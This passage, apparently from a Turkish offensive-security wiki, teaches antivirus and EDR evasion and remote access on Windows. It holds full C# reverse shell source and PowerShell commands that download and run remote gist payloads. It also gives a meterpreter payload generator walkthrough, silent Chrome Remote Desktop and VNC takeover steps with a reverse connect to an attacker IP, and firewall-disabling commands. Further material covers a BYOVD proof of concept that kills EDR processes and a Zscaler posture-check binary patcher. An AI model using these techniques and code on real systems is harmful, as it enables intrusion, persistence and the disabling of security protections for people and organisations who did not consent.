Çıktı, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2. Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx-aware fork'u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
• de4dot, control-flow flattening'i geri alır, orijinal namespace'leri, class'ları ve variable name'lerini geri yükler ve constant string'lerin şifresini çözer.

3. Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method call'larını lightweight wrapper'larla (diğer adıyla *proxy call'lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opaque wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4. Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; *gerçek* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak depolar.

Yukarıdaki chain, malicious sample'ı çalıştırmaya gerek kalmadan execution flow'u geri yükler. Bu, offline bir workstation üzerinde çalışırken yararlıdır.

> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı bir custom attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış yazılım güvenliği sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in open-source bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici tool kullanmadan ve compiler'ı değiştirmeden, `C++11/14` language kullanarak compile time'da obfuscated code üretmeyi gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework tarafından oluşturulan obfuscated operation'lar katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE file'ları obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executable'lar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM destekli language'ler için fine-grained code obfuscation framework'üdür. ROPfuscator, regular instruction'ları ROP chain'lerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal control flow'a ilişkin doğal kavrayışımızı engeller.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürüp ardından yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious application'ları çalıştırmaya karşı korumayı amaçlayan bir security mechanism'dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak reputation-based bir yaklaşım kullanır; yani yaygın olarak indirilmeyen application'lar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve file'ı çalıştırmasını engeller (ancak file, More Info -> Run anyway'e tıklanarak yine de çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen file'lar indirildikleri URL ile birlikte otomatik olarak oluşturulan, Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir file için Zone.Identifier ADS'nin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin oldukça etkili bir yolu, onları ISO gibi bir tür container'ın içine package etmektir. Bunun nedeni, Mark-of-the-Web (MOTW)'nin **non-NTFS** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçınmak için output container'larına package eden bir tool'dur.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak security ürünleri tarafından malicious activity'leri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin disable edilmesine (bypass edilmesine) benzer şekilde, user space process'in **`EtwEventWrite`** function'ının herhangi bir olay loglamadan hemen return etmesini sağlamak da mümkündür. Bu işlem, function'ın memory'de patch'lenerek hemen return etmesi sağlanır ve böylece ilgili process için ETW logging effectively disable edilir.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini memory'de load etmek uzun zamandır bilinen bir yöntemdir ve post-exploitation tool'larınızı AV tarafından yakalanmadan çalıştırmak için hâlâ oldukça iyi bir yöntemdir.

Payload doğrudan memory'ye load edileceği ve diske dokunmayacağı için yalnızca tüm process için AMSI'yi patch'lemeye dikkat etmemiz gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan memory'de execute etme özelliğini zaten sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntemde **yeni bir sacrificial process spawn edilir**, post-exploitation malicious code'unuz bu yeni process'e inject edilir, malicious code'unuz execute edilir ve işlem tamamlandığında yeni process kill edilir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın **Beacon implant process'imizin dışında** gerçekleşmesidir. Bu, post-exploitation action'ımızda bir şeyler ters giderse veya yakalanırsa **implant'imizin hayatta kalma ihtimalinin çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma ihtimalinizin daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation malicious code'un **kendi process'ine** inject edilmesini ifade eder. Bu şekilde yeni bir process oluşturmak ve bunu AV tarafından scan ettirmek zorunda kalmazsınız; ancak dezavantajı, payload'unuzun execution'ı sırasında bir şeyler ters giderse crash yaşanabileceğinden **beacon'ınızı kaybetme ihtimalinizin çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assemblies'lerini **PowerShell'den** de load edebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği üzere, compromised machine'a **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a** erişim vererek diğer dilleri kullanıp malicious code execute etmek mümkündür.

SMB share üzerindeki Interpreter Binaries'lerine ve environment'a erişim verilerek, bu dillerdeki **arbitrary code'u compromised machine'ın memory'si içinde execute edebilirsiniz**.

Repo'da şu belirtilmektedir: Defender script'leri hâlâ scan eder; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla esnekliğe** sahip oluruz. Bu dillerde random ve un-obfuscated reverse shell script'leriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, EDR veya AV gibi bir security product'ın access token'ını manipüle eder. Token'ın privilege'larını azaltmak, process'in çalışmaya devam etmesini sağlarken privileged inspection veya remediation action'larını gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**bu blog post'ta**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı üzere, Chrome Remote Desktop'ı victim'ın PC'sine deploy etmek ve ardından bunu kullanarak PC'yi takeover edip persistence sağlamak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden download edin, "Set up via SSH" seçeneğine tıklayın ve ardından MSI dosyasını download etmek için Windows MSI dosyasına tıklayın.
2. Installer'ı victim üzerinde silently çalıştırın (admin gereklidir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Wizard sizden authorize olmanızı isteyecektir; devam etmek için Authorize button'a tıklayın.
4. Sağlanan command'i gerekli düzenlemelerle execute edin: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter'ı GUI kullanmadan PIN'i ayarlar).


## Advanced Evasion

Evasion oldukça karmaşık bir konudur; bazen tek bir system içindeki birçok farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.

Karşılaşacağınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha Advanced Evasion technique'leri hakkında fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu talk'u izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu, [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan bir başka harika talk'tur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Defender'ın hangi kısmı malicious olarak tespit ettiğini bulup size ayırması için binary'nin bölümlerini **tespit edene kadar kaldıran** [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
Aynı işi yapan bir diğer tool ise [**avred**](https://github.com/dobin/avred)'dir; bu hizmeti açık web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunar.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, (administrator olarak) şu komut çalıştırılarak install edebileceğiniz bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlasın** ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (gizlenme) ve güvenlik duvarını devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup yerine bin downloads dosyalarını istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server'ı yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir parola belirleyin
- _View-Only Password_ alanında bir parola belirleyin

Ardından, _**winvnc.exe**_ binary'sini ve **yeni oluşturulan** _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection** yakalamaya **hazır** olması için kendi **host**'u içinde `vncviewer.exe -listen 5900` binary'sini **çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için birkaç şey yapmamalısınız

- `winvnc` zaten çalışıyorsa yeniden başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
- `winvnc`'yi aynı dizinde `UltraVNC.ini` olmadan başlatmayın; aksi hâlde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı** `msfconsole -r file.rc` ile **başlatın** ve **xml payload**'ı şu şekilde **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler kullanarak
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Savunmasız Driver'ını Getir (BYOVD) – AV/EDR'ı Kernel Space'ten Sonlandırma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Araç, **kendi savunmasız ancak *imzalı* driver'ını** getirir ve bunu, Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli çıkarımlar
1. **İmzalı driver**: Diske teslim edilen dosya `ServiceMouse.sys` olsa da binary, Antiy Labs’in “System In-Depth Analysis Toolkit” ürünündeki meşru olarak imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver'ı **kernel service** olarak kaydeder, ikinci satır ise `\\.\ServiceMouse`'un user land'den erişilebilir hâle gelmesi için driver'ı başlatır.
3. **Driver tarafından sunulan IOCTL'ler**
| IOCTL code | Yetenek                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process'i sonlandırma (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, sonlandırabilir veya kernel object'lerini kurcalayabilir.

Tespit / Azaltma
•  Microsoft’un vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys`'nin yüklenmesini reddeder.
•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable directory'den yüklendiğinde veya allow-list'te bulunmadığında alarm üretin.
•  Custom device object'lerine açılan user-mode handle'larını ve bunları takip eden şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki Binary Patching ile Zscaler Client Connector Posture Check'lerini Atlatma

Zscaler’ın **Client Connector** ürünü device-posture kurallarını yerel olarak uygular ve sonuçları diğer component'lere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir bypass'ı mümkün kılar:

1. Posture evaluation **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
2. Internal RPC endpoint'leri yalnızca bağlantı kuran executable'ın `WinVerifyTrust` aracılığıyla **Zscaler tarafından imzalandığını** doğrular.<sup>[[11]](#references)</sup>

**Disk üzerindeki dört imzalı binary'yi patch'leyerek** her iki mekanizma da etkisiz hâle getirilebilir:

| Binary | Patch'lenen orijinal logic | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her check'in uyumlu olması için daima `1` döndürür |
| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP-ed ⇒ herhangi bir (unsigned olsa bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Kısa devre yapılır |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve service stack'i yeniden başlattıktan sonra:

* **Tüm** posture check'ler **green/compliant** görüntülenir.
* İmzalanmamış veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`) açabilir.
* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e unrestricted access elde eder.

Bu case study, tamamen client-side trust kararlarının ve basit signature check'lerinin birkaç byte patch'iyle nasıl aşılabileceğini gösterir.

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender'ın **Boot-Time Removal** driver'ı, klasik BYOVD'ye yararlı bir counterexample'dır. `BTR.sys`, memory-corruption bug'ı ve IOCTL interface'i bulunmayan, Microsoft tarafından legitimate şekilde imzalanmış bir remediation component'idir; administrator access ve `SeLoadDriverPrivilege` elde edildikten sonra operator bunun yerine private remediation transaction'ını taklit edebilir ve amaçlanan Ring-0 file/registry operasyonlarını elde edebilir. Bu, **initial access veya privilege escalation değil, post-compromise AV/EDR-neutralization primitive'idir** ve driver, dikkat çekici bir third-party driver import etmek yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` resource'undan extract edilebilir.<sup>[[36]](#references)</sup>

### One-shot driver'ı staging etme

Defender normalde resource'u rastgele bir `[a-z]{8}.sys` dosyası olarak drop eder ve benzer şekilde adlandırılmış bir kernel service register eder. `DriverEntry`, service'in `Args` value'sunu okur, belirtilen NTFS ADS'yi açar, action list'i decrypt edip validate eder, feedback yazar ve başarılı execution sonrasında `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür; böylece driver resident olarak kalmak yerine unload edilir. Forged service aşağıdaki characteristic value'lara sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
`:changelist` stream'i, RC4 ile şifrelenmiş bir blob içerir. Analiz edilen build'ler sabit 256 baytlık bir anahtarı yeniden kullandığından şifreleme bir authorization boundary değildir. Geçerli bir plaintext, 24 baytlık global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC'si ve payload'dan türetilen bir transaction ID) ile başlar; bunu null-terminated UTF-16 feedback path'i ve herhangi sayıda item izler. Her item, action'a özgü data ve **tam olarak dört NUL byte** ile sonlanan bir 16 baytlık header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) içerir. Her header/data bölgesi, CRC-32 polynomial `0xEDB88320`, başlangıç state'i `0xFFFFFFFF` ve **final XOR olmadan** (`~CRC32`) bağımsız olarak kontrol edilir; CRC state'i her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri bu kernel primitive'lerini açığa çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli bir dosya da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı attacker tarafından seçilen protected path'e taşır; boş bir destination silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'i recursive olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'sunu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value'su oluşturur/günceller ve eksik key path'lerini oluşturur |

